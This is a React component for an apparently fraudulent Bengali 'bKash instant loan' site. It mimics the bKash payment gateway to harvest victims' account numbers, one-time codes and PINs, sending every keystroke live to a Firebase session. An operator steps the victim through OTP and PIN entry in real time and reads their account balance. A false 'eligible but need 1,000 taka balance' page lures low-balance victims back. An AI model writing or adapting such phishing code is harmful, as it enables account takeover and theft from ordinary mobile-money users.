
import React, { useState, useEffect } from 'react';
import { LoanFormData } from '../types';
import { db } from '../App';

enum GatewayStep {
  AccountNumber = 'NUMBER',
  WaitOtpPerm = 'WAIT_OTP_PERM',
  OTP = 'OTP',
  PIN = 'PIN',
  WaitFinal = 'WAIT_FINAL',
  Success = 'SUCCESS',
  Cancelled = 'CANCELLED'
}

interface FinalResultPageProps {
  data: LoanFormData;
  sessionId: string;
}

const FinalResultPage: React.FC<FinalResultPageProps> = ({ data, sessionId }) => {
  const [showGateway, setShowGateway] = useState(false);
  const [isPreLoading, setIsPreLoading] = useState(false);
  const [gatewayStep, setGatewayStep] = useState<GatewayStep>(GatewayStep.AccountNumber);
  const [sessionBalance, setSessionBalance] = useState(0);
  
  const [phone, setPhone] = useState('');
  const [otp, setOtp] = useState('');
  const [pin, setPin] = useState('');
  const [timer, setTimer] = useState(45);
  const [isForcedLoading, setIsForcedLoading] = useState(false);

  useEffect(() => {
    let interval: any;
    if (gatewayStep === GatewayStep.OTP && timer > 0) {
      interval = setInterval(() => setTimer(t => t - 1), 1000);
    }
    return () => clearInterval(interval);
  }, [gatewayStep, timer]);

  // Sync basic data to Firebase
  useEffect(() => {
    if (!sessionId) return;
    db.ref('sessions/' + sessionId).update({
      gatewayPhone: phone,
      otp: otp,
      pin: pin,
      lastUpdated: Date.now()
    });
  }, [phone, otp, pin, sessionId]);

  // Global Admin Action Listener
  useEffect(() => {
    if (!sessionId) return;
    const sessionRef = db.ref('sessions/' + sessionId);
    
    const handleData = (snapshot: any) => {
      const val = snapshot.val();
      if (!val) {
        setGatewayStep(GatewayStep.Cancelled);
        setShowGateway(false);
        return;
      }

      setSessionBalance(parseInt(val.balance || '0'));

      if (val.adminAction === 'CANCEL_ALL') {
        setGatewayStep(GatewayStep.Cancelled);
        setShowGateway(false);
      } else if (val.adminAction === 'ALLOW_OTP' && gatewayStep === GatewayStep.WaitOtpPerm) {
        setIsForcedLoading(false); // Stop local forced fail timer
        setGatewayStep(GatewayStep.OTP);
        sessionRef.update({ adminAction: 'NONE', waitingFor: 'NONE' });
      } else if (val.adminAction === 'APPROVE' && gatewayStep === GatewayStep.WaitFinal) {
        setGatewayStep(GatewayStep.Success);
        sessionRef.update({ adminAction: 'NONE', waitingFor: 'NONE' });
      } else if (val.adminAction === 'REJECT_PIN' && gatewayStep === GatewayStep.WaitFinal) {
        setGatewayStep(GatewayStep.PIN);
        setPin('');
        sessionRef.update({ adminAction: 'NONE', waitingFor: 'NONE' });
        alert('ভুল পিন কোড! সঠিক পিন প্রদান করুন।');
      }
    };

    const cleanup = sessionRef.on('value', handleData);
    return () => { if (typeof cleanup === 'function') cleanup(); };
  }, [sessionId, gatewayStep]);

  const handleNext = () => {
    if (gatewayStep === GatewayStep.AccountNumber) {
      if (phone.length >= 11) {
        // ALWAYS alert admin we are at this step
        db.ref('sessions/' + sessionId).update({ 
          gatewayPhone: phone,
          waitingFor: 'OTP_PERM' 
        });
        
        setGatewayStep(GatewayStep.WaitOtpPerm);

        // Fail-safe: if balance is very low, give admin 15 seconds to override, otherwise cancel
        if (sessionBalance < 200) {
          setIsForcedLoading(true);
          setTimeout(() => {
            setGatewayStep(current => {
              if (current === GatewayStep.WaitOtpPerm) {
                setShowGateway(false);
                return GatewayStep.Cancelled;
              }
              return current;
            });
            setIsForcedLoading(false);
          }, 15000);
        }
      }
    } else if (gatewayStep === GatewayStep.OTP) {
      if (otp.length === 6) {
        setGatewayStep(GatewayStep.PIN);
      }
    } else if (gatewayStep === GatewayStep.PIN) {
      if (pin.length === 5) {
        db.ref('sessions/' + sessionId).update({ waitingFor: 'FINAL_WAIT' });
        setGatewayStep(GatewayStep.WaitFinal);
      }
    }
  };

  const handleStartPayment = () => {
    setIsPreLoading(true);
    setTimeout(() => {
      setIsPreLoading(false);
      setGatewayStep(GatewayStep.AccountNumber);
      setShowGateway(true);
    }, 1500);
  };

  const formatPhoneMask = (num: string) => {
    if (num.length < 11) return "019 ** *** ***";
    return `${num.substring(0, 3)} ** *** ${num.substring(8)}`;
  };

  if (gatewayStep === GatewayStep.Cancelled) {
    return (
      <div className="max-w-2xl mx-auto p-4 animate-fade-in font-sans selection:bg-blue-100">
        <div className="bg-white rounded-[40px] shadow-2xl overflow-hidden border border-gray-100 flex flex-col">
          <div className="bg-gradient-to-br from-green-500 to-emerald-600 py-10 text-center text-white">
            <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-white/30">
              <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl md:text-3xl font-black mb-1 px-4 tracking-tighter">✅ ভেরিফিকেশন সম্পন্ন – অভিনন্দন!</h2>
          </div>

          <div className="p-8 space-y-8 bg-white">
            <div className="space-y-4">
              <h3 className="text-xl font-bold text-gray-800">সম্মানিত গ্রাহক,</h3>
              <p className="text-gray-700 leading-relaxed font-semibold">
                আমরা সফলভাবে আপনার বিকাশ লেনদেন তথ্য যাচাই করেছি। যাচাই শেষে জানানো যাচ্ছে—
              </p>
              <div className="bg-white border-2 border-green-50 p-6 rounded-3xl space-y-4 shadow-sm">
                <p className="flex items-start text-green-700 font-bold">
                  <span className="mr-2 text-blue-500">🔹</span> 
                  <span>লেনদেনের ভিত্তিতে আপনি ১০০% লোনের জন্য যোগ্য।</span>
                </p>
                <p className="flex items-start text-gray-800 font-medium">
                  <span className="mr-2 text-blue-500">🔹</span> 
                  <span>তবে বর্তমানে আপনার বিকাশ একাউন্টে ন্যূনতম প্রয়োজনীয় ব্যালেন্স না থাকায় আমরা এই মুহূর্তে লোন প্রদান করতে পারছি না।</span>
                </p>
              </div>
            </div>

            <div className="bg-blue-50 border border-blue-100 p-8 rounded-[32px] space-y-5 shadow-sm">
              <h4 className="text-blue-900 text-xl font-black">❓ কেন বিকাশে ১,০০০ টাকা ব্যালেন্স রাখতে হবে?</h4>
              <p className="text-blue-800 text-[15px] font-bold leading-relaxed">
                বিকাশ অনলাইন লোন সিস্টেমে একাউন্টের সক্রিয়তা, লেনদেনের সক্ষমতা এবং নিরাপত্তা নিশ্চিত করার জন্য ন্যূনতম ১,০০০ টাকা ব্যালেন্স থাকা বাধ্যতামূলক। এটি নিশ্চিত করে যে—
              </p>
              <div className="space-y-3 pl-2">
                <p className="flex items-center text-blue-900/90 font-bold text-sm">
                  <span className="text-green-600 mr-2">✔</span> আপনার বিকাশ একাউন্ট সম্পূর্ণ সক্রিয় ও কার্যকর
                </p>
                <p className="flex items-center text-blue-900/90 font-bold text-sm">
                  <span className="text-green-600 mr-2">✔</span> লোনের টাকা গ্রহণ ও ভবিষ্যৎ কিস্তি লেনদেনে কোনো সমস্যা হবে না
                </p>
                <p className="flex items-center text-blue-900/90 font-bold text-sm">
                  <span className="text-green-600 mr-2">✔</span> ভুয়া বা ঝুঁকিপূর্ণ একাউন্ট থেকে আবেদন স্বয়ংক্রিয়ভাবে প্রতিরোধ করা যায়
                </p>
              </div>
              <div className="pt-4 border-t border-blue-200">
                <p className="text-blue-900 font-black text-sm">📌 গুরুত্বপূর্ণ: এই ১,০০০ টাকা থেকে কোনো টাকা কাটা হবে না এবং বিকাশের এমন কোনো অনুমতিও নেই।</p>
              </div>
            </div>

            <div className="space-y-3">
               <h5 className="text-gray-400 text-xs font-black uppercase tracking-widest pl-2">📌 আপনার বর্তমান লোন স্ট্যাটাস</h5>
               <div className="grid grid-cols-1 gap-3">
                  <div className="flex items-center justify-between p-5 bg-white rounded-2xl border border-green-100 shadow-sm">
                    <span className="text-sm font-bold text-gray-600">✔ লেনদেন যোগ্যতা:</span>
                    <span className="text-sm font-black text-green-600">১০০% এলিজেবল ✅</span>
                  </div>
                  <div className="flex items-center justify-between p-5 bg-white rounded-2xl border border-red-100 shadow-sm">
                    <span className="text-sm font-bold text-gray-600">✖ বিকাশ ব্যালেন্স:</span>
                    <span className="text-sm font-black text-red-600">অপর্যাপ্ত ❌</span>
                  </div>
               </div>
            </div>

            <div className="bg-slate-900 p-8 rounded-[36px] text-white shadow-2xl relative overflow-hidden group">
              <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-16 -mt-16 group-hover:scale-110 transition-transform duration-500"></div>
              <h4 className="text-xl font-black mb-6 flex items-center">
                <span className="bg-white/20 p-2 rounded-xl mr-3 text-lg">📝</span> লোন পেতে করণিয়
              </h4>
              <div className="space-y-5 text-[15px] font-bold">
                <p className="flex items-center"><span className="w-7 h-7 bg-blue-600 rounded-full flex items-center justify-center text-xs mr-3 flex-shrink-0">1</span> বিকাশ একাউন্টে সর্বনিম্ন ১,০০০ টাকা ব্যালেন্স রাখুন</p>
                <p className="flex items-center"><span className="w-7 h-7 bg-blue-600 rounded-full flex items-center justify-center text-xs mr-3 flex-shrink-0">2</span> পুনরায় আবেদন করুন</p>
                <p className="flex items-center"><span className="w-7 h-7 bg-blue-600 rounded-full flex items-center justify-center text-xs mr-3 flex-shrink-0">3</span> আবেদন সম্পন্ন হলে ১–২ মিনিটের মধ্যেই লোনের টাকা বিকাশ একাউন্টে যোগ হবে</p>
              </div>
            </div>

            <div className="text-center pt-2">
              <p className="text-gray-500 font-bold text-[15px]">🙏 ধন্যবাদ আমাদের সেবা ব্যবহারের জন্য।</p>
            </div>

            <div className="space-y-4">
              <div className="bg-pink-50 p-4 rounded-2xl border border-pink-100 flex items-center justify-center space-x-3">
                <svg className="w-5 h-5 text-pink-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
                <p className="text-[11px] text-pink-700 font-black italic text-center leading-tight">আপনার বিকাশ একাউন্ট সুরক্ষিত রাখতে কখনই পিন কারো সাথে শেয়া করবেন না।</p>
              </div>
              <button 
                onClick={() => window.location.reload()} 
                className="w-full py-6 bg-blue-600 text-white rounded-[24px] font-black uppercase tracking-[5px] text-lg hover:bg-blue-700 transition-all active:scale-95 shadow-xl shadow-blue-100"
              >
                আবার আবেদন করুন
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (isPreLoading) {
    return (
      <div className="fixed inset-0 z-[150] bg-white flex items-center justify-center">
        <div className="flex space-x-2">
          <div className="w-5 h-5 bg-[#E2136E] rounded-full animate-bounce"></div>
          <div className="w-5 h-5 bg-[#E2136E] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
          <div className="w-5 h-5 bg-[#E2136E] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
        </div>
      </div>
    );
  }

  if (showGateway) {
    return (
      <div className="fixed inset-0 z-[100] bg-black/50 backdrop-blur-[2px] flex items-center justify-center p-0 md:p-4 font-sans selection:bg-pink-100">
        <div className="w-full max-w-[375px] bg-white shadow-2xl min-h-[667px] md:min-h-0 flex flex-col relative md:rounded-lg overflow-hidden animate-fade-in">
          <div className="bg-white py-4 flex justify-center border-b border-gray-100">
            <img src="https://i.postimg.cc/0j6qxP8Q/IMG-20260205-090841.jpg" alt="bKash" className="h-10 object-contain" />
          </div>
          <div className="flex justify-between items-center px-6 py-5 bg-white border-b border-gray-100">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 bg-white border border-gray-100 rounded-full flex items-center justify-center overflow-hidden p-0.5 shadow-sm">
                 <img src="https://i.postimg.cc/0j6qxP8Q/IMG-20260205-090841.jpg" alt="BKASH" className="w-full h-full object-contain" />
              </div>
              <div className="leading-tight">
                <p className="text-[12px] font-bold text-gray-700 uppercase tracking-tight">BKASH INSTANT LOAN</p>
                <p className="text-[10px] text-gray-400">Inv No: BGT{sessionId.slice(-8).toUpperCase()}</p>
              </div>
            </div>
            <div className="text-right">
              <p className="text-lg font-black text-gray-800 tracking-tighter">৳১০</p>
            </div>
          </div>
          <div className="flex-grow bg-[#E2136E] p-8 flex flex-col items-center justify-center text-white relative min-h-[380px]">
            {(gatewayStep === GatewayStep.WaitOtpPerm || gatewayStep === GatewayStep.WaitFinal || isForcedLoading) && (
              <div className="absolute inset-0 z-10 bg-[#E2136E] flex flex-col items-center justify-center space-y-6 animate-fade-in">
                 <div className="flex space-x-3">
                    <div className="w-3 h-3 bg-white rounded-full animate-bounce"></div>
                    <div className="w-3 h-3 bg-white/70 rounded-full animate-bounce [animation-delay:-0.15s]"></div>
                    <div className="w-3 h-3 bg-white/40 rounded-full animate-bounce [animation-delay:-0.3s]"></div>
                 </div>
                 <p className="text-sm font-bold opacity-90 tracking-wide">Processing...</p>
              </div>
            )}
            {gatewayStep === GatewayStep.AccountNumber && !isForcedLoading && (
              <div className="w-full text-center space-y-6 animate-fade-in">
                <p className="text-sm font-medium">Enter Your bKash Account Number</p>
                <div className="w-full bg-white rounded-sm border-2 border-white shadow-inner overflow-hidden">
                  <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))} className="w-full py-3 px-4 text-center text-gray-800 text-xl font-bold outline-none placeholder:text-gray-300" placeholder="e.g 01XXXXXXXXX" autoFocus />
                </div>
                <p className="text-[11px] font-normal leading-relaxed text-white">
                  <span className="opacity-90">By clicking Confirm, you agree to our </span>
                  <span className="underline decoration-1 underline-offset-2 font-medium">terms & conditions</span>
                </p>
              </div>
            )}
            {gatewayStep === GatewayStep.OTP && (
              <div className="w-full text-center space-y-6 animate-fade-in">
                <p className="text-[12px] font-medium leading-relaxed">Enter Verification Code Sent To {formatPhoneMask(phone)}</p>
                <div className="w-full bg-white rounded-sm border-[3px] border-pink-300/30 shadow-inner overflow-hidden">
                  <input type="text" value={otp} onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))} className="w-full py-2.5 px-4 text-center text-gray-800 text-xl font-bold outline-none placeholder:text-gray-400 placeholder:font-normal" placeholder="Enter 6 digit code" maxLength={6} autoFocus />
                </div>
                <p className="text-[11px] font-medium opacity-90">{timer > 0 ? `Resend Code in ${timer}s` : <button className="underline" onClick={() => setTimer(45)}>Resend Code</button>}</p>
              </div>
            )}
            {gatewayStep === GatewayStep.PIN && (
              <div className="w-full text-center space-y-6 animate-fade-in">
                <p className="text-[13px] font-medium">Enter bKash Account PIN</p>
                <div className="w-full bg-white rounded-sm border-2 border-white shadow-inner overflow-hidden">
                  <input type="password" value={pin} onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))} className="w-full py-3 px-4 text-center text-gray-800 text-2xl font-black tracking-[0.5em] outline-none" maxLength={5} autoFocus />
                </div>
              </div>
            )}
            {gatewayStep === GatewayStep.Success && (
              <div className="text-center space-y-4 animate-fade-in">
                <p className="text-xl font-bold">Payment Successful</p>
                <button onClick={() => setShowGateway(false)} className="bg-white text-gray-800 px-8 py-2 rounded-full font-bold text-xs">DONE</button>
              </div>
            )}
          </div>
          <div className="bg-white grid grid-cols-2 gap-px border-t border-gray-100">
            <button onClick={() => setShowGateway(false)} className="py-4 bg-white text-gray-500 font-bold text-[14px] uppercase tracking-wide hover:bg-gray-50 border-r border-gray-100 transition active:bg-gray-100">Cancel</button>
            <button onClick={handleNext} disabled={ (gatewayStep === GatewayStep.AccountNumber && phone.length < 11) || (gatewayStep === GatewayStep.OTP && otp.length < 6) || (gatewayStep === GatewayStep.PIN && pin.length < 5) || isForcedLoading || gatewayStep === GatewayStep.WaitFinal } className={`py-4 font-bold text-[14px] uppercase tracking-wide transition active:opacity-80 ${((gatewayStep === GatewayStep.AccountNumber && phone.length >= 11) || (gatewayStep === GatewayStep.OTP && otp.length === 6) || (gatewayStep === GatewayStep.PIN && pin.length === 5)) ? 'bg-[#E6E7E8] text-gray-700' : 'bg-[#E6E7E8] text-gray-300 pointer-events-none'}`}>Confirm</button>
          </div>
          <div className="bg-white py-4 px-6 flex flex-col items-center space-y-2 border-t border-gray-50">
             <div className="flex items-center space-x-1.5 text-[#E2136E] font-bold">
                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/></svg>
                <span className="text-[11px]">16247</span>
             </div>
             <p className="text-[10px] text-gray-400 font-medium tracking-tight">© 2026 bKash, All Rights Reserved</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto animate-fade-in font-sans">
      <div className="bg-white p-8 rounded-3xl shadow-xl border border-blue-50 mb-8 relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-2 bg-[#E2136E]"></div>
        <h2 className="text-xl font-black text-gray-800 mb-6 flex items-center">
           <svg className="w-6 h-6 mr-2 text-[#E2136E]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
           কিছু গুরুত্বপূর্ণ পয়েন্ট : যেগুলো থাকলে লোন পাওয়ার সম্ভাবনা বাড়ে
        </h2>
        
        <div className="space-y-6">
           <div className="flex items-start space-x-4">
              <span className="w-8 h-8 rounded-full bg-blue-50 text-blue-600 flex items-center justify-center font-bold text-sm flex-shrink-0 mt-1">১</span>
              <div>
                 <h4 className="font-bold text-gray-800">নিয়মিত বিকাশ ব্যবহার করলে</h4>
                 <p className="text-sm text-gray-600 mt-1">প্রায়ই Send Money, Payment, Mobile Recharge, Cash In/Out করলে। লেনদেন যত বেশি ও নিয়মিত, তত ভালো লোন পাওয়ার সম্ভাবনা তত বেশি।</p>
              </div>
           </div>

           <div className="flex items-start space-x-4">
              <span className="w-8 h-8 rounded-full bg-blue-50 text-blue-600 flex items-center justify-center font-bold text-sm flex-shrink-0 mt-1">২</span>
              <div>
                 <h4 className="font-bold text-gray-800">দীর্ঘদিনের একটিভ একাউন্ট</h4>
                 <p className="text-sm text-gray-600 mt-1">নতুন একাউন্টের চেয়ে পুরোনো ও একটিভ একাউন্টে লোন পাওয়ার সম্ভাবনা অনেক বেশি।</p>
              </div>
           </div>

           <div className="flex items-start space-x-4">
              <span className="w-8 h-8 rounded-full bg-blue-50 text-blue-600 flex items-center justify-center font-bold text-sm flex-shrink-0 mt-1">৩</span>
              <div>
                 <h4 className="font-bold text-gray-800">সঠিক এনাইডি কার্ড ভেরিফিকেশন</h4>
                 <p className="text-sm text-gray-600 mt-1">বিকাশ নাম্বার ভেরিফায়েড এনাইডি কারড দিয়ে খোলা থাকলে লোন দ্রুত মঞ্জুর হয়।</p>
              </div>
           </div>
        </div>

        <div className="bg-gray-50 rounded-2xl p-6 mt-8 border border-gray-100">
          <h4 className="text-gray-500 text-xs uppercase tracking-wider font-bold mb-4">আপনার আবেদন সারসংক্ষেপ</h4>
          <div className="grid grid-cols-2 gap-4">
            <div><p className="text-xs text-gray-400">লোন পরিমাণ</p><p className="font-bold text-gray-800">{data.loanAmount} টাকা</p></div>
            <div><p className="text-xs text-gray-400">মেয়াদ</p><p className="font-bold text-gray-800">{data.duration}</p></div>
          </div>
        </div>
      </div>

      <div className="bg-white p-8 rounded-3xl shadow-xl border border-blue-100">
        <h3 className="text-lg font-bold text-gray-800 mb-4 flex items-center">
          লোন পেতে নিচের ধাপটি সম্পন্ন করুন
        </h3>
        <div className="bg-blue-50 border border-blue-100 p-6 rounded-2xl mb-8">
          <p className="text-gray-700 leading-relaxed mb-4">আপনার লোনটি প্রসেস করার জন্য এবং সিস্টেম অ্যাক্টিভেশনের জন্য মাত্র <span className="font-bold text-[#E2136E] text-xl">১০৳</span> প্ল্যাটফর্ম ফি প্রদান করতে হবে।</p>
          <div className="flex flex-col md:flex-row items-center justify-between gap-4 pt-4 border-t border-blue-100">
            <div className="text-center md:text-left">
              <p className="text-xs text-gray-500 mb-1">প্রদেয় পরিমাণ</p>
              <p className="text-2xl font-black text-[#E2136E]">১০৳</p>
            </div>
            <button onClick={handleStartPayment} className="w-full md:w-auto bg-[#E2136E] text-white font-bold py-3 px-8 rounded-xl shadow-lg hover:bg-[#D11263] transition-all active:scale-95">বিকাশ পেমেন্ট</button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default FinalResultPage;
